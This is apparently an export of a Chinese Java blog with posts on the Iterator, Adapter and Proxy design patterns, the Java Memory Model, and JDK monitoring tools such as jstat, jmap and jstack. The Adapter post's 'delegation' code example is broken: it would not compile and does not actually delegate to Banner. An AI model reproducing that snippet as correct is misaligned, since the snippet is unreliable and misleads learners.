<p>一个重要的理由是，引入Iterator后可以将遍历与实现分离开来。请看下面的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(bIterator.hasNext()) &#123;</span><br><span class="line">			Book book = (Book) bIterator.next();</span><br><span class="line">			System.out.println(book.getName());</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>这里只使用了Itreator的hasNext和next方法，并没有调用BookShelf的方法。也就是说，<strong>这里的while循环并不依赖于BookShelf的实现</strong>。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>迭代器模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-适配器模式</title>
    <url>/2020/04/08/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>适配器模式（Adapter Pattern）是作为两个不兼容的接口之间的桥梁。这种类型的设计模式属于结构型模式，它结合了两个独立接口的功能。</p>
<p>适配器模式有以下两种：</p>
<ul>
<li>类适配器模式（使用继承的适配器）</li>
<li>对象适配器模式（使用委托的适配器）</li>
</ul>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-08-adapter1.png" alt="适配器模式-使用继承类图"></p>
<p><img src="https://huhansi.github.io/images/2020-04-08-adapter2.png" alt="适配器模式-使用委托类图"></p>
<h3 id="Target（对象）"><a href="#Target（对象）" class="headerlink" title="Target（对象）"></a>Target（对象）</h3><p>负责定义所需的方法</p>
<h3 id="Client（请求者）"><a href="#Client（请求者）" class="headerlink" title="Client（请求者）"></a>Client（请求者）</h3><p>负责使用Target角色所定义的方法进行具体处理。</p>
<h3 id="Adaptee（被适配）"><a href="#Adaptee（被适配）" class="headerlink" title="Adaptee（被适配）"></a>Adaptee（被适配）</h3><p>Adaptee是一个持有既定方法的角色</p>
<h3 id="Adapter（适配）"><a href="#Adapter（适配）" class="headerlink" title="Adapter（适配）"></a>Adapter（适配）</h3><p>使用Adaptee的方法来满足Target角色的需求。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="继承示例"><a href="#继承示例" class="headerlink" title="继承示例"></a>继承示例</h3><h4 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h4><p><img src="https://huhansi.github.io/images/2020-04-08-adapter3.png" alt="适配器模式-使用继承类图"></p>
<h4 id="Banner"><a href="#Banner" class="headerlink" title="Banner"></a>Banner</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Banner</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String string;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Banner</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.string = string;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showWithParen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"("</span> + string + <span class="string">")"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showWithAster</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"*"</span> + string + <span class="string">"*"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Print"><a href="#Print" class="headerlink" title="Print"></a>Print</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Print</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">printWeak</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">printStrong</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="PrintBanner"><a href="#PrintBanner" class="headerlink" title="PrintBanner"></a>PrintBanner</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrintBanner</span> <span class="keyword">extends</span> <span class="title">Banner</span> <span class="keyword">implements</span> <span class="title">Print</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">PrintBanner</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(string);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printWeak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		showWithParen();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printStrong</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		showWithAster();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Print p = <span class="keyword">new</span> PrintBanner(<span class="string">"Hello"</span>);</span><br><span class="line">		p.printWeak();</span><br><span class="line">		p.printStrong();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="委托示例"><a href="#委托示例" class="headerlink" title="委托示例"></a>委托示例</h3><h4 id="类图-2"><a href="#类图-2" class="headerlink" title="类图"></a>类图</h4><p><img src="https://huhansi.github.io/images/2020-04-08-adapter4.png" alt="适配器模式-使用委托类图"></p>
<p>委托模式和继承模式的区别主要是在Print类和PringBanner类上</p>
<h4 id="Print-1"><a href="#Print-1" class="headerlink" title="Print"></a>Print</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Print</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">printWeak</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">printStrong</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="PrintBanner-1"><a href="#PrintBanner-1" class="headerlink" title="PrintBanner"></a>PrintBanner</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrintBanner</span> <span class="keyword">extends</span> <span class="title">Print</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Banner banner;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">PrintBanner</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(string);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printWeak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		showWithParen();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printStrong</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		showWithAster();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>适配器模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Java内存模型</title>
    <url>/2020/04/07/Java/JVM/2020-03-29-Java-%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="Java内存模型"><a href="#Java内存模型" class="headerlink" title="Java内存模型"></a>Java内存模型</h1><p>Java内存模型是为了屏蔽各种硬件和操作系统的内存访问差异，以实现让Java程序在各种平台下都能达到一致的内存访问效果。</p>
<h2 id="主内存与工作内存"><a href="#主内存与工作内存" class="headerlink" title="主内存与工作内存"></a>主内存与工作内存</h2><p>Java内存模型的主要目的是定义程序中各种变量的访问规则，即关注在虚拟机中把变量值存储到内存和从内存中取出变量值这样的底层细节。此处的变脸包含了实例字段、静态字段和构成数组对象的元素，但是不包括局部变量与方法参数，因为后两者是线程私有的，不会被共享，自然就不存在竞争问题。</p>
<p>Java内存模型规定了所有的变量都存储在主内存中。每条线程还有自己的工作内存，线程的工作内存中保存了被该线程使用的变量的主内存副本，线程对变量的所有操作都必须在工作内存中尽进行，而不能直接读写主内存中的数据。不同线程之间也无法直接访问对方工作内存中的变量，线程间变量值的传递均需要通过主内存来完成，线程、主内存、工作内存三者的交互关系如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-04-07-jmmmode.jpg" alt="主内存、工作内存、线程三者的交互关系"></p>
<h2 id="内存间交互操作"><a href="#内存间交互操作" class="headerlink" title="内存间交互操作"></a>内存间交互操作</h2><p>Java内存模型定义了8中操作来实现变量从主内存拷贝到工作内存和从工作内存同步到主内存。</p>
<p>Java虚拟机实现时必须保证下面提及的每一种操作都是原子的、不可再分的（对于double和long类型的变量来说，load、store、read和write操作在某些平台上允许有例外）</p>
<ul>
<li>lock（锁定）：作用域主内存的变量，它把一个变量表示为一条线程独占的状态</li>
<li>unlock（解锁）：作用于主内存的变量，它把一个处于锁定状态的变量释放出来，释放后的变量才可以被其他线程锁定</li>
<li>read（读取）：作用于主内存的变量，它把一个变量的值从主内存传输到线程的工作内存中，以便随后的load动作使用</li>
<li>load（载入）：作用于工作内存的变量，它把read操作从主内存中得到的变量值放入工作内存的变量副本中</li>
<li>use（使用）：作用于工作内存的变量，它把工作内存中的一个变量的值传递给执行引擎，每当虚拟机遇到一个需要使用变量的值的字节码指令时执行这个操作</li>
<li>assign（赋值）：作用于工作内存的变量，它把一个从执行引擎接收的值赋给工作内存的变量，每当虚拟机遇到一个给变量赋值的字节码指令时执行这个操作</li>
<li>store（存储）：作用于工作内存的变量，它把工作内存中的一个变量的值传送到主内存中，以便随后的write操作使用</li>
<li>write（写入）：作用域主内存的变量，它把store操作从工作内存中得到的变量的值放入主内存的变量中</li>
</ul>
<p>如果要把一个变量从主内存拷贝到工作内存，那就要按顺序执行read和load操作，如果要把变量从工作内存同步回主内存，就要按顺序执行store和write操作。注意，Java内存模型只要求上述两个操作必须按顺序执行，但不要求是连续执行。也就是read和load之间、store和write之间是可以插入其他指令的，如对主内存中的变量a、b进行访问时，一种可能出现的顺序是read a、read b，load b、load a。除此之外，Java内存模型还规定了在执行上述8中基本操作时必须满足如下规则：</p>
<ul>
<li>不允许read和load、store和write操作之一单独出现，即不允许一个变量从主内存读取了但工作内存不接受，或者工作内存发起回写了但主内存不接受的情况</li>
<li>不允许一个线程丢弃它最近的assign操作，即变量在工作内存中改变了之后必须把该变化同步回主内存</li>
<li>不允许一个线程无原因地（没有发生过任何assign操作）把数据从线程的工作内存同步回主内存中</li>
<li>一个新的变量只能在主内存中“诞生”，不允许在工作内存中直接使用一个未被初始化（load或assign）的变量，换句话说就是对一个变量实施use、store操作之前必须先执行assign和load操作</li>
<li>一个变量在同一个时刻只允许一条线程对其进行lock操作，但lock操作可以被同一条线程重复执行多次，多次执行lock后，只有执行相同次数的unlock操作，变量才会被解锁</li>
<li>如果对一个变量执行lock操作，那将会清空工作内存中此变量的值，在执行引擎使用这个变量前，需要中兴执行load或assign操作以初始化变量的值</li>
<li>如果一个变量实现没有被lock操作锁定，那就不允许对它执行unlock操作，也不允许去unlock一个呗其他线程锁定的变量</li>
<li>对一个变量执行unlock操作之前，必须先把此变量同步回主内存中（执行store、write操作）</li>
</ul>
<h2 id="对volatile型变量的特殊规则"><a href="#对volatile型变量的特殊规则" class="headerlink" title="对volatile型变量的特殊规则"></a>对volatile型变量的特殊规则</h2><p>当一个变量被定义成volatile之后，它将具备两项特性：</p>
<ul>
<li>保证此变量对所有线程的可见性。当一条线程修改了这个变量的值，新值对于其他线程来说是可以立即得知的。</li>
<li>禁止指令重排序优化</li>
</ul>
<p>假设T表示一个线程，V和W分别表示两个volatile型变量，那么在进行read、load、use。assign、store和write操作时需要满足如下规则：</p>
<ul>
<li><p>只有当线程T对变量V执行的前一个动作是load时，线程T才能对变量V执行use动作；并且，只有当线程T对变量V执行的后一个动作是use的时候，线程T才能对变量V执行load动作。线程T对变量V的use动作可以认为是和线程T对变量V的load、read动作相关量的，必须连续且一起出现。</p>
<blockquote>
<p>这条规则要求在工作内存中，每次使用V前都必须先从主内存刷新最新的值，用于保证能看见其他线程对变量V所做的修改</p>
</blockquote>
</li>
<li><p>只有当线程T对变量V执行的前一个动作是assign的时候，线程T才能对变量V执行store动作；并且，只有当线程T对变量V执行的后一个动作是store的时候，线程T才能对变量V执行assign工作。线程T对变量V的assign动作可以认为是和线程T对变量V的store、write动作相关联的，必须连续且一起出现。</p>
<blockquote>
<p>这条规则要求在工作内存中，每次修改V后都必须立刻同步回主内存中，用于保证其他线程可以看到自己对变量V所做的修改</p>
</blockquote>
<p>  假定动作A是线程T对变量V实施的use或assign动作，假定动作F是和动作A相关联的load或store动作，假定动作P是和动作F相应的对变量V的read或write动作；与此类似，假定动作B是线程T对变量W实施的use或assign动作，假定动作G是和动作B相关联的load 或store动作，假定动作Q是和动作G响应的对变量W的read和write动作，如果A先于B，那么P先于Q。</p>
<blockquote>
<p>这条规则要求volatile修饰的变量不会被指令重排序优化，从而保证代码的执行顺序和程序的执行顺序相同</p>
</blockquote>
</li>
</ul>
<h2 id="先行发生原则"><a href="#先行发生原则" class="headerlink" title="先行发生原则"></a>先行发生原则</h2><p>先行发生原则指的是Java内存模型中定义的两项操作之间的偏序关系，比如说操作A先行发生于操作B，起始就是说是在发生操作B之前，操作A产生的影响能被操作B观察到，”影响“包括修改了内存中共享变量的值、发送了消息、调用了方法等。</p>
<p>下面是Java内存模型下一些“天然的”先行发生关系，这些线程发生关系无需任何同步器协助就已经存在，可以在编码中直接使用。如果两个操作之间的关系不在刺裂，并且无法送下列规则推导出来，则它们就没有顺序型保障，虚拟机可以对它们随意地进行重排序</p>
<ul>
<li><strong>程序次序规则</strong>：在一个线程内，按照控制流顺序，书写在前面的操作先行发生于书写在后面的操作。注意，这里说的是控制流顺序而不是程序代码顺序，因为要考虑分支、循环等结构。</li>
<li><strong>管程锁定规则</strong>：一个unlock操作先行发生于后面对同一个锁的lock操作。这里必须强调的是“同一个锁”，而“后面”同样是只时间上的先后</li>
<li><strong>volatile变量规则</strong>：对一个volatile变量的写操作先行发生于后面这个变量的读操作，这里的“后面”同样是指时间上的先后</li>
<li><strong>线程启动规则</strong>：Thread对象的start()方法先行发生于此线程的每一个动作。</li>
<li><strong>线程终止规则</strong>：线程中所有操作都先行发生于对此线程的终止检测，我们可以通过Thread::join()方法是否结束，Thread::isAlive()的返回值等手段检测线程是否已经终止执行</li>
<li><strong>线程中断规则</strong>：对线程interrupt()方法的调用先行发生于被中断线程的代码检测到中断事件的发生，可以通过Thread::interrupted()方法检测是否有中断发生</li>
<li><strong>对象终结规则</strong>：一个对象的初始化完成先行发生于它的finalize()方法的开始</li>
<li><strong>传递性</strong>：如果操作A先行发生与操作B，操作B先行发生于操作C，那就可以得出操作A先行发生于操作C的结论</li>
</ul>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
        <tag>内存模型</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-jvm自带的性能监控与故障处理工具</title>
    <url>/2020/04/07/Java/JVM/2020-04-07-Java-jvm%E8%87%AA%E5%B8%A6%E7%9A%84%E6%80%A7%E8%83%BD%E7%9B%91%E6%8E%A7%E4%B8%8E%E6%95%85%E9%9A%9C%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h1 id="jvm自带的性能监控与故障处理工具"><a href="#jvm自带的性能监控与故障处理工具" class="headerlink" title="jvm自带的性能监控与故障处理工具"></a>jvm自带的性能监控与故障处理工具</h1><h2 id="jps：虚拟机进程状况工具"><a href="#jps：虚拟机进程状况工具" class="headerlink" title="jps：虚拟机进程状况工具"></a>jps：虚拟机进程状况工具</h2><p>jps（JVM Process Status）可以列出正在运行的虚拟机进程，并显示虚拟机执行主类（Main Class，main()函数所在的类）名称以及这些进程的本地虚拟机唯一ID（LVMID，LocalVirtual Machine Identifier）。</p>
<p>jps命令格式：</p>
<blockquote>
<p>jps [ option ] [ host_id ]</p>
</blockquote>
<p>jps执行样例：</p>
<p><img src="https://huhansi.github.io/images/2020-04-07-jps1.png" alt="jps执行样例"></p>
<p>jps还可以通过RMI协议查询开启了RMI服务的远程虚拟机进程状态，参数host_id为RMI注册表中注册的主机名。</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>-q</td>
<td>只输出LVMID，省略主类的名称</td>
</tr>
<tr>
<td>-m</td>
<td>输出虚拟机进程启动时传递给主类main()的参数</td>
</tr>
<tr>
<td>-l</td>
<td>输出主类的全名，如果进程执行的是JAR包，则输出JAR路径</td>
</tr>
<tr>
<td>-v</td>
<td>输出虚拟机进程启动时的JVM参数</td>
</tr>
</tbody></table>
<h2 id="jstat：虚拟机统计信息监视工具"><a href="#jstat：虚拟机统计信息监视工具" class="headerlink" title="jstat：虚拟机统计信息监视工具"></a>jstat：虚拟机统计信息监视工具</h2><p>jstat（JVM Statistics Monitoring Tool）适用于监视虚拟机各种运行状态信息的命令行工具。它可以显示本地或者远程虚拟机进程中的类加载、内存、垃圾收集、即时编译等运行时数据，在没有GUI图形界面、只提供了纯文本控制台环境的服务器上，它将是运行期定位虚拟机性能问题的常用工具。</p>
<p>jstat命令格式为：</p>
<blockquote>
<p>jstat [ option vmid [interval[s|ms] [count]] ]</p>
</blockquote>
<p>对于命令格式中的VMID与LVMID需要特别说明下：如果是本地虚拟机进程，VMID与LVMID是一致的；如果是远程虚拟机进程，那VMID格式应当是：</p>
<blockquote>
<p>[ protocol : ] [//]lvmid[@hostname[:port]/servername]</p>
</blockquote>
<p>参数interval和count代表查询的间隔和次数，如果省略这两个参数，说明只查询一次。假设需要没250毫秒查询一次进程10432垃圾收集状况，一共查询20次，那命令应当是：</p>
<blockquote>
<p>jstat -gc 10432 250 20</p>
</blockquote>
<p>选项option代表用户希望查询的虚拟机信息，主要分为三类：类加载、垃圾收集、运行期编译状况。</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>-class</td>
<td>监视类加载、卸载数量、总空间以及类装载锁耗费的时间</td>
</tr>
<tr>
<td>-gc</td>
<td>监视Java堆状况，包括Eden区、2个Survivor区、老年代、永久代等的容量，已用空间，垃圾收集时间合计等</td>
</tr>
<tr>
<td>-gccapacity</td>
<td>监视内容与-gc基本相同，但输出主要关注Java堆各个区域使用到的最大、最小空间</td>
</tr>
<tr>
<td>-gcutil</td>
<td>监视内容与-gc基本相同，但输出主要关注已使用空间占总空间的百分比</td>
</tr>
<tr>
<td>-gccause</td>
<td>与-gcutil功能一样，但是会额外输出导致上一次垃圾收集产生的原因</td>
</tr>
<tr>
<td>-gcnew</td>
<td>监视新生代垃圾收集状况</td>
</tr>
<tr>
<td>-gcnewcapacity</td>
<td>监视内容与-gcnew基本相同，输出主要关注使用到的最大、最小空间</td>
</tr>
<tr>
<td>-gcold</td>
<td>监视老年代垃圾收集状况</td>
</tr>
<tr>
<td>-gcoldcapacity</td>
<td>监视内容与-gcold基本相同，输出主要关注使用到的最大、最小空间</td>
</tr>
<tr>
<td>-gcpermcapacity</td>
<td>输出永久代熟用到的最大、最小空间</td>
</tr>
<tr>
<td>-compiler</td>
<td>输出即时编译器编译过的方法、耗时等 信息</td>
</tr>
<tr>
<td>-printcompilation</td>
<td>输出已经被即时编译的方法</td>
</tr>
</tbody></table>
<p>jstat执行样例1：</p>
<blockquote>
<p>jstat -gcutil 10432 5000 20</p>
</blockquote>
<p><img src="https://huhansi.github.io/images/2020-04-07-jstat1.png" alt="jstat执行样例1"></p>
<p>jstat执行样例2：</p>
<blockquote>
<p>jstat -gc 10432 5000 20</p>
</blockquote>
<p><img src="https://huhansi.github.io/images/2020-04-07-jstat1.png" alt="jstat执行样例1"></p>
<h2 id="jinfo：Java配置信息工具"><a href="#jinfo：Java配置信息工具" class="headerlink" title="jinfo：Java配置信息工具"></a>jinfo：Java配置信息工具</h2><p>jinfo（Configuration Info for Java）的作用是实时查看和调整虚拟机各项参数。使用jsp -v命令可以查看虚拟机启动时显式指定的参数列表，但如果向知道未被显式指定的参数的系统默认值，除了去找资料外，就只能使用jinfo的-flag选项进行查询了。jinfo还可以使用-sysprops选项把虚拟机进程的System.getProperties()的内容打印出来。</p>
<blockquote>
<p> jinfo [ option ] pid</p>
</blockquote>
<p><img src="https://huhansi.github.io/images/2020-04-07-jinfo1.png" alt="jinfo执行样例1"></p>
<h2 id="jmap：内存映像工具"><a href="#jmap：内存映像工具" class="headerlink" title="jmap：内存映像工具"></a>jmap：内存映像工具</h2><p>jmap（Memory Map for Java）命令用于生成堆转储快照（一般称为heapdump或dump文件）。如果不使用jmap的作用不仅仅是为了获取堆转储快照，它还可以查询finalize执行队列、Java堆和方法区的详细信息，如空间使用率、当前用的是哪种收集器等。</p>
<p>jmap命令格式：</p>
<blockquote>
<p>jmap [ option ] vmid</p>
</blockquote>
<table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>-dump</td>
<td>生成Java对转储快照。格式为-dump:[live,]format=b,file=&lt;filename&gt;，其中live自参数说明是否只dump出存活的对象</td>
</tr>
<tr>
<td>-finalizerinfo</td>
<td>显示在F-Queue中等待Finalizer线程执行finalize方法的对象。旨在Linux/Solaris平台下有效。</td>
</tr>
<tr>
<td>-heap</td>
<td>显示Java堆详细信息，如使用哪种回收器、参数配置、分代状况等。只在Linux/Solaris平台下有效</td>
</tr>
<tr>
<td>-histo</td>
<td>显示堆中对象统计信息，包括类、实例数量、合计容量</td>
</tr>
<tr>
<td>-permstat</td>
<td>以ClassLoader为统计口径显示永久代内存状态。只在Linux/Solaris平台下有效</td>
</tr>
<tr>
<td>-F</td>
<td>当虚拟机进程对-dump选项没有响应时，可使用这个选项强制生成dump快照。只在Linux/Solaris平台下有效</td>
</tr>
</tbody></table>
<p><img src="https://huhansi.github.io/images/2020-04-07-jmap1.png" alt="jmap执行样例1"></p>
<h2 id="jhat：虚拟机堆转储快照分析工具"><a href="#jhat：虚拟机堆转储快照分析工具" class="headerlink" title="jhat：虚拟机堆转储快照分析工具"></a>jhat：虚拟机堆转储快照分析工具</h2><p>jhat(JVM Heap Analysis Tool)命令与jmap搭配使用，来分析jmap生成的堆转储快照。jhat内置了一个微型的HTTP/Web服务器，生成堆转储快照的分析结果后，可以在浏览器中查看</p>
<p>jhat命令格式</p>
<blockquote>
<p>jhat filename</p>
</blockquote>
<p><img src="https://huhansi.github.io/images/2020-04-08-jhat1.png" alt="jhat执行样例1"></p>
<p>出现“Server is ready”后，在浏览器上输入“<a href="http://localhost:7000”查看分析结果">http://localhost:7000”查看分析结果</a></p>
<p><img src="https://huhansi.github.io/images/2020-04-08-jhat2.png" alt="jhat执行样例2"></p>
<h2 id="jstack：Java堆栈跟踪工具"><a href="#jstack：Java堆栈跟踪工具" class="headerlink" title="jstack：Java堆栈跟踪工具"></a>jstack：Java堆栈跟踪工具</h2><p>jstack（Stack Trace for Java）命令用于生成虚拟机当前时刻的线程快照（一般称为threaddump或者javacode文件）。线程快照就是当前虚拟机内每一条线程正在执行的方法堆栈集合，生成线程快照的目的通常是定位线程出现长时间停顿的原因，如线程间死锁、死循环、请求外部资源导致的长时间挂起等，都是导致线程长时间停顿的常见原因。线程出现停顿时通过jstack来查看各个线程的调用堆栈，就可以获知没有响应的线程到底在后台做些什么事情或者等待着什么资源。</p>
<p>jstack命令格式：</p>
<blockquote>
<p>jstack [ option ] vmid</p>
</blockquote>
<table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>-F</td>
<td>当正常输出的请求不被响应时，强制输出线程堆栈</td>
</tr>
<tr>
<td>-l</td>
<td>除堆栈外，显示关于锁的附加信息</td>
</tr>
<tr>
<td>-m</td>
<td>如果调用到本地方法的话，可以显示c/c++的堆栈</td>
</tr>
</tbody></table>
<p><img src="https://huhansi.github.io/images/2020-04-08-jstack1.png" alt="jhat执行样例2"></p>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
        <tag>jps</tag>
        <tag>jstat</tag>
        <tag>jmap</tag>
        <tag>jstack</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-代理</title>
    <url>/2020/04/07/Java/JVM/2020-04-07-Java-%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h1 id="Java中的代理"><a href="#Java中的代理" class="headerlink" title="Java中的代理"></a>Java中的代理</h1><h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><h3 id="模式定义"><a href="#模式定义" class="headerlink" title="模式定义"></a>模式定义</h3><p>为其他对象提供一种代理以控制对这个对象的访问。对一个对象进行访问控制的一个原因是为了只有在我们确实需要这个对象时才对它进行创建和初始化。</p>
<h3 id="模式结构"><a href="#模式结构" class="headerlink" title="模式结构"></a>模式结构</h3><p>代理模式的结构图如下所示：</p>
<p><img src="https://huhansi.github.io/images/2020-04-07-proxy-uml.png" alt="代理模式结构图"></p>
<p>用代码描述就是：</p>
<h4 id="Subject"><a href="#Subject" class="headerlink" title="Subject"></a>Subject</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">Request</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="RealSubject"><a href="#RealSubject" class="headerlink" title="RealSubject"></a>RealSubject</h4><p>RealSubject实现了Subject接口，并重写了Request方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RealSubject</span> <span class="keyword">implements</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Request</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		System.out.println(<span class="string">"RealSubject Request method called."</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SubjectProxy"><a href="#SubjectProxy" class="headerlink" title="SubjectProxy"></a>SubjectProxy</h4><p>SubjectProxy也实现了Subject接口，重写了Request，并且它还保存着一个RealSubject的引用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SubjectProxy</span> <span class="keyword">implements</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	RealSubject realSubject;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Request</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		System.out.println(<span class="string">"Before call RealSubject Request"</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == realSubject) &#123;</span><br><span class="line">			realSubject = <span class="keyword">new</span> RealSubject();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		realSubject.Request();</span><br><span class="line">		</span><br><span class="line">		System.out.println(<span class="string">"After call RealSubject Request"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Test-测试类"><a href="#Test-测试类" class="headerlink" title="Test 测试类"></a>Test 测试类</h4><p>最后是一个测试类，说明代理模式的用法</p>
